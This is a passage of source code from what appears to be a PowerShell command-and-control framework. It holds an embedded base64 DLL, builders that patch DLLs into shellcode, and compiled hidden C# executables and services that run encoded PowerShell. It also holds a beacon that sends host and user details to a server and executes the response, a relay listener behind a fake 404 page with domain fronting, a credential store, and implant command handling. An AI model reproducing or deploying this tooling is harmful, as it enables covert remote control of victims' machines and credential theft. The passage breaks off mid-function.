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nuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qMio2KjoqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitiK2YraituK3Irdit6K34rQiuGK4orjiuSK5YrmiueK6IrpiuqK64rsiu2K7orviuCK8YryivOK9Ir1ivaK94r4ivmK+or7ivyK/Yr+iv+K8AAAAQAQCIAAAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ijAAAAIAEA0AEAABCgIKAwoECgUKBgoHCggKCQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArgBQAQAQAAAAaKWApYilAAAAgAEASAAAAACgqKLApQimKKZIpmimiKa4ptCm2KbgphinIKdAqEioUKhYqGCoaKhwqHiogKiIqJiooKioqLCouKjAqMio0KgAwAEAFAAAABCkOKRYpICkqKTYpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

    $payloadraw = [Convert]::ToBase64String($bytes)
    $RawBytes = [System.Convert]::FromBase64String($86)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x86'
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload_x86.dll", $dllBytes)
    Write-Host -Object "x86 DLL Written to: $FolderPath\payloads\proxypayload_x86.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File "$FolderPath\payloads\proxypayload_x86.dll"
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload-shellcode_x86.bin", $shellcodeBytes)
    Write-Host -Object "x86 Shellcode Written to: $FolderPath\payloads\proxypayload-shellcode_x86.bin"  -ForegroundColor Green

    $RawBytes = [System.Convert]::FromBase64String($64)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x64'
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload_x64.dll", $dllBytes)
    Write-Host -Object "x64 DLL Written to: $FolderPath\payloads\proxypayload_x64.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File "$FolderPath\payloads\proxypayload_x64.dll"
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload-shellcode_x64.bin", $shellcodeBytes)
    Write-Host -Object "x64 Shellcode Written to: $FolderPath\payloads\proxypayload-shellcode_x64.bin"  -ForegroundColor Green


    $praw = [Convert]::ToBase64String($bytes)
    $cscservicecode = 'using System;
    using System.Text;
    using System.ServiceProcess;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;


    namespace Service
    {
        static class Program
        {
            static void Main()
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new Service1()
                };
                ServiceBase.Run(ServicesToRun);
            }
        }
        public partial class Service1 : ServiceBase
        {
            public static string InvokeAutomation(string cmd)
            {
                Runspace newrunspace = RunspaceFactory.CreateRunspace();
                newrunspace.Open();
                RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
                Pipeline pipeline = newrunspace.CreatePipeline();

                pipeline.Commands.AddScript(cmd);
                Collection<PSObject> results = pipeline.Invoke();
                newrunspace.Close();

                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    stringBuilder.Append(obj);
                }
                return stringBuilder.ToString().Trim();
            }

            protected override void OnStart(string[] args)
            {
                try
                {
                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(tt);
                }
                catch (ArgumentException e)
                {
                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(tt);
                }
            }

            protected override void OnStop()
            {
            }
        }
    }'
    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy-service.cs", $cscservicecode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
        }
    }
    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy-service.exe"  -ForegroundColor Green


    $csccode = 'using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}
    
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Program.Main();       
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        Pipeline pipeline = newrunspace.CreatePipeline();

        pipeline.Commands.AddScript(cmd);
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
}'

    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy.cs", $csccode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
        }
    }
    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy.exe"  -ForegroundColor Green

    }
function Invoke-DaisyChain {
param($port, $daisyserver, $c2server, $c2port, $domfront, $proxyurl, $proxyuser, $proxypassword)

$daisycommand = '$serverhost="'+$daisyserver+'"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$serverport='+$port+'
$server=$serverhost+":"+$serverport
function Get-Webclient ($Cookie) {
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
} $wc }
function primer {
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("$server/daisy")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'


$fdsf = @"
`$username = "$proxyuser"
`$password = "$proxypassword"
`$proxyurl = "$proxyurl"
`$domainfrontheader = "$domfront"
`$serverport = '$port'
`$Server = "${c2server}:${c2port}"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
function Get-Webclient (`$Cookie)
{
`$username = `$username
`$password = `$password
`$proxyurl = `$proxyurl
`$wc = New-Object System.Net.WebClient;  
`$h=`$domainfrontheader
if (`$h) {`$wc.Headers.Add("Host",`$h)}
if (`$proxyurl) {
`$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
`$wc.Proxy = `$wp;
}
if (`$username -and `$password) {
`$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
`$getcreds = new-object system.management.automation.PSCredential `$username,`$PSS; 
`$wp.Credentials = `$getcreds;
} else {
`$wc.UseDefaultCredentials = `$true; 
}
if (`$cookie) {
`$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=`$Cookie")
}
`$wc
}
`$httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
'
`$URLS = '/connect',"/images/static/content/","/news/","/webapp/static/","/images/prints/","/wordpress/site/","/steam","/true/images/77/","/holidngs/images/","/daisy"
`$listener = New-Object -TypeName System.Net.HttpListener 
`$listener.Prefixes.Add("http://+:`$serverport/") 
`$listener.Start()
echo "started http server"
while (`$listener.IsListening) 
{
    `$message = `$null
    `$context = `$listener.GetContext() # blocks until request is received
    `$request = `$context.Request
    `$response = `$context.Response       
    `$url = `$request.RawUrl
    `$method = `$request.HttpMethod
    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) 
    {  
        `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
        `$responseStream = `$request.InputStream 
        `$targetStream = New-Object -TypeName System.IO.MemoryStream 
        `$buffer = new-object byte[] 10KB 
        `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
        `$downloadedBytes = `$count 
        while (`$count -gt 0) 
        { 
            `$targetStream.Write(`$buffer, 0, `$count) 
            `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
            `$downloadedBytes = `$downloadedBytes + `$count 
        } 
        `$len = `$targetStream.length
        `$size = `$len + 1
        `$size2 = `$len -1
        `$buffer = New-Object byte[] `$size
        `$targetStream.Position = 0
        `$targetStream.Read(`$buffer, 0, `$targetStream.Length)|Out-null
        `$buffer = `$buffer[0..`$size2]
        `$targetStream.Flush()
        `$targetStream.Close() 
        `$targetStream.Dispose()
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
        if (`$method -eq "GET") {
        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString(`$Server+`$url)
        }
        if (`$method -eq "POST") {
        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$Server`$url", `$buffer)
        }
    }
    if (!`$message) {
        `$message = `$httpresponse
        echo `$request
    }
    [byte[]] `$buffer = [System.Text.Encoding]::UTF8.GetBytes(`$message)
    `$response.ContentLength64 = `$buffer.length
    `$response.StatusCode = 200
    `$response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    `$response.Headers.Add("Pragma", "no-cache")
    `$response.Headers.Add("Expires", 0)
    `$output = `$response.OutputStream
    `$output.Write(`$buffer, 0, `$buffer.length)
    `$output.Close()
    `$message = `$null
}
`$listener.Stop()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)

$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
$bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
$payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
$payload = $payloadraw -replace "`n", ""

if (-not (Test-Path "$FolderPath\payloads\daisypayload.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
} 
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload2.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload2.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload2.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload3.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload3.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload3.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload4.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload4.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload4.bat"  -ForegroundColor Green
} else {
    Write-Host "Cannot create payload"
}
$rundaisy = @"
`$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
if (!`$t) { 
    if (Test-Administrator) { 
        start-job -ScriptBlock {$NewScript} | Out-Null 
    }
}

"@
[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $rundaisy)
Write-Host -Object "DaisyServer bat written to: $FolderPath\payloads\daisyserver.bat"  -ForegroundColor Green

return $rundaisy
}

function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

function Upload-File
{
    param
    (
        [string] $Source,
        [string] $Destination
    )
 
    $Source = Resolve-PathSafe $Source
     
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
     
    $reader = [System.IO.File]::OpenRead($Source)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    "Upload-File -Destination '$Destination' -Base64 $base64"
    $reader.Dispose()
}
function CheckModuleLoaded {
    param
    (
    [string] $ModuleName,
    [string] $IMRandomURI
    )
    $ModuleName = $ModuleName.ToLower();
    $modsloaded = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$IMRandomURI'" -As SingleValue
    if (!$modsloaded.contains("$ModuleName")){
        $modsloaded = $modsloaded + " $ModuleName"
        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='$modsloaded' WHERE RandomURI='$IMRandomURI'"|Out-Null
        $query = "INSERT INTO NewTasks (RandomURI, Command)
        VALUES (@RandomURI, @Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
            RandomURI = $IMRandomURI
            Command   = "LoadModule $ModuleName"
        } | Out-Null
    }
}

function creds {
    param
    (
    [string] $action,
    [string] $username,
    [string] $password,
    [string] $hash,
    [string] $credsID
    )

    switch ($action){
            "dump" {
                $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds" -As PSObject
                Write-Output -InputObject $dbResult | ft -AutoSize | Out-Host
                $t = $dbResult | ft -AutoSize | Out-String
                return $t
            }
            "add" {
                if ($password){
                    $t = add-creds -username $username -password $password
                    return $t
                } elseif ($hash){
                    $t = add-creds -username $username -hash $hash
                    return $t
                } else {
                    return "Unable to create credentials in database."
                }
            }
            "del" {
                $t = Del-Creds $CredsID
                return $t
            }
            "search" {
                $t = Search-Creds $username
                return $t
            }
            default {
                return "No action defined for: '$action'"
            }
    }
}
function Add-Creds {
    param
    (
    [string] $Username,
    [string] $Password,
    [string] $Hash
    )
    if ($Username){
        Invoke-SqliteQuery -DataSource $Database -Query "INSERT INTO Creds (username, password, hash) VALUES ('$username','$password','$hash')"|Out-Null
        return "$Username added to the database"
    } else {
        return "No username or password specified. Please complete both arguments."
    }
}

function Search-Creds {
    param
    (
    [string] $Username
    )
        if ($Username){
            $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds WHERE username LIKE '%$username%'" -As PSObject
            Write-Output -InputObject $dbResult | ft -AutoSize | Out-Host
            return $dbResult | ft -AutoSize | Out-String
        } else {
            return "No username specified. Please complete all necessary arguments."
        }
}

function Del-Creds {
    param
    (
    [string] $CredsID
    )
    if ($credsID){
        $dbResult = Invoke-SqliteQuery -Datasource $database -Query "SELECT credsid, username FROM Creds Where CredsID == '$credsID'" -As DataRow
        $caption = "Delete Credentials from Database?";
        $message = "Credential: " + $dbResult.Item(0) + " - " + $dbResult.Item(1);
        $yes = new-Object System.Management.Automation.Host.ChoiceDescription "&Yes","YES";
        $no = new-Object System.Management.Automation.Host.ChoiceDescription "&No","NO";
        $choices = [System.Management.Automation.Host.ChoiceDescription[]]($yes,$no);
        $answer = $host.ui.PromptForChoice($caption,$message,$choices,0)

        switch ($answer){
            0 {Invoke-SqliteQuery -Datasource $database -Query "DELETE FROM Creds Where CredsID == '$credsID'" | out-null; return "Deleting Credentials"}
            1 {return "No selected, no changes made";}
        }
    } else {
        return "No CredsID specified. Please complete all necessary arguments."
    }
}

# run startup function
startup

function runcommand {

param
(
[string] $pscommand,
[string] $psrandomuri
)
# alias list
            if ($pscommand.ToLower().StartsWith('load-module'))
            { 
                $pscommand = $pscommand -replace "load-module","loadmodule"
            }
            if ($pscommand)
            { 
                CheckModuleLoaded "Implant-Core.ps1" $psrandomuri
            }
            if ($pscommand -eq 'Get-ExternalIP') 
            {
                $pscommand = '(get-webclient).downloadstring("http://ipecho.net/plain")'
            }  
            if ($pscommand -eq 'getuid') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }  
            if ($pscommand -eq 'ps') 
            {
                $pscommand = 'get-processfull'
            }
            if ($pscommand -eq 'id') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'whoami') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Kill-Implant') 
            {
                $pscommand = 'exit'
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$psrandomuri'"|Out-Null
            }
            if ($pscommand -eq 'Show-ServerInfo') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                Write-Host $dbresult
            }
            if ($pscommand -eq 'get-pid') 
            {
                $pscommand = $null
